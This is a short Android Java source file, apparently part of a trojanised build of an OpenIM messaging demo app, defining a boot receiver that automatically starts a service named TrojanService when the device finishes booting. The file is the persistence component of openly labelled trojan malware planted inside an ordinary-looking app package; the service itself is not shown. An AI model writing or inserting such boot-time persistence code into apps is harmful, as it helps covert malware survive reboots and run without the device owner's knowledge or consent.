package io.openim.android.demo.trojan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Boot receiver - starts TrojanService when device boots
 */
public class TrojanBootReceiver extends BroadcastReceiver {
    private static final String TAG = "TroBoot";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "Boot completed, starting service");
            Intent serviceIntent = new Intent(context, io.openim.android.demo.trojan.TrojanService.class);
            context.startService(serviceIntent);
        }
    }
}
